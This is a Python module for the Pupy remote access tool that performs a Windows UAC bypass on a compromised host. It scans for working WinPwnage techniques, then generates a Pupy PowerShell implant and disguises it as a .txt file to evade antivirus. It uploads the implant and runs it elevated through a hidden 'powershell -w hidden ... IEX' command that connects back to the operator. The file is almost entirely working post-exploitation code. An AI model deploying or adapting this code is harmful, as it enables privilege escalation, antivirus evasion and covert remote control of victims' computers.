# -*- coding: utf-8 -*-
# Bypassuac techniques use WinPwnage tool
# https://github.com/rootm0s/WinPwnage

import os

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from rpyc.utils.classic import upload

import pupygen
import random
import string

__class_name__ = "BypassUAC"


@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):

    dependencies = ['winpwnage.core', 'winpwnage.functions.uac']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="bypassuac", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-l', dest='scan', action='store_true', default=False,
            help="List all possible techniques for this host")
        cls.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
        cls.arg_parser.add_argument(
            '-r', dest='restart', action='store_true', default=False,
            help="Restart current executable as admin")
        cls.arg_parser.add_argument(
            '-m', dest='method',
            help="Should be an ID, get the list scanning which methods are possible (-l)")

    def parse_result(self, result, print_result=True, get_method_id=True):
        """
        Parse result returned by WinPwnage
        Return the best method id if possible
        """
        func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
        preferred_method = ('01', '02', '03', '04', '08', '09', '10')
        method_id = []
        for tag, message in result:
            if tag in func:
                if print_result:
                    func[tag](message)
                if tag == 'ok' and get_method_id:
                    method_id.append(message.split()[0])

        if get_method_id:
            for p in preferred_method:
                if p in method_id:
                    return p

    def launch_scan(self, print_result=True):
        """
        Check all possible methods found on the target to bypass uac
        """
        scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)
        result = scanner(uac=True, persist=False).start()
        return self.parse_result(result, print_result)

    def run(self, args):

        # Check if a UAC bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        if args.scan:
            self.launch_scan()
            return

        if not args.scan and not args.method:
            method = self.launch_scan(print_result=False)
            if not method:
                self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
                return
        else:
            method = args.method

        # TO CHANGE:
        # A way should be found to automatically generate a dll (ex: using a generic dll which launch a bat script)
        if method in ('11', '12', '13', '14'):
            self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')
            return

        # Weird error, root cause not found yet
        if method in '07':
            self.warning('This technique does not work with custom exe, only work with cmd.exe')
            return

        # Check if it is a bind shell
        is_bind_launcher = False
        launcher_type, address_port = self.client.desc['launcher'], self.client.desc['address']

        # Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
        if launcher_type == "bind":
            self.info(
                'The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(
                    address_port))
            is_bind_launcher = True

        # ------------------ Prepare the payload ------------------

        ros = self.client.conn.modules['os']
        tempdir = self.client.conn.modules['tempfile'].gettempdir()
        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
        local_file = ''
        remotefile = ''

        if not args.exe and not args.restart:
            self.info('Using powershell payload')
            if is_bind_launcher:
                self.info("BIND launcher is on the target. So a BIND ps1 will be used in child launcher. "
                          "This ps1 will listen on your given port")
                self.info("Be careful, you have to choose a port which is not used on the target!")

                listening_port = -1
                while listening_port == -1:
                    try:
                        listening_port = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again ({})".format(e))

                listening_address = address_port.split(':')[0]
                bind_address_and_port = "{0}:{1}".format(listening_address, listening_port)
                self.info("The ps1 script used for bypassing UAC will be configured for listening on {0} on the target".format(bind_address_and_port))
                bind_conf = self.client.get_conf()

                # Modify the listening port on the conf. If it is not modified,
                # the ps1 script will listen on the same port as the initial pupy launcher on the target
                bind_conf['launcher_args'][bind_conf['launcher_args'].index("--port")+1] = str(listening_port)
                client_conf = bind_conf
            else:
                self.info("Reverse connection mode: Configuring ps1 client with the same configuration as "
                          "the (parent) launcher on the target")
                client_conf = self.client.get_conf()

            if '64' in self.client.desc['proc_arch']:
                local_file = pupygen.generate_ps1(self.log, client_conf, x64=True)
            else:
                local_file = pupygen.generate_ps1(self.log, client_conf, x86=True)

            # change the ps1 to txt file to avoid AV detection
            remotefile = ros.path.join(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="txt"))

            cmd = u'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden ' \
                  u'-noni -nop -c "cat %s | Out-String | IEX"' % remotefile

        # use a custom exe to execute as admin
        elif args.exe:
            self.info('Using custom executable')
            if os.path.exists(args.exe):
                local_file = args.exe
                cmd = ros.path.join(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="exe"))
            else:
                self.error('Executable file not found: %s' % args.exe)
                return

        # restart the current executable as admin
        else:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd = self.client.desc['exec_path']

        # upload payload (ps1 or custom exe)
        if not args.restart:
            self.info("Uploading to %s" % remotefile)
            upload(self.client.conn, local_file, remotefile)

        # ------------------ Ready to launch the bypassuac ------------------

        self.info("Bypass uac could take few seconds, be patient...")
        bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)
        result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)
        if not result:
            self.error('Nothing done, check if the id is on the list')
        else:
            self.parse_result(result, get_method_id=False)

        # Powershell could be longer to execute
        if not args.exe and not args.restart:
            self.info("Waiting for a connection (take few seconds, 1 min max)...")

        # TO DO (remove ps1 file)
        # ros.remove(remotefile) # not work if removed too fast

        # Remove generated ps1 file
        if not args.exe and not args.restart:
            os.remove(local_file)
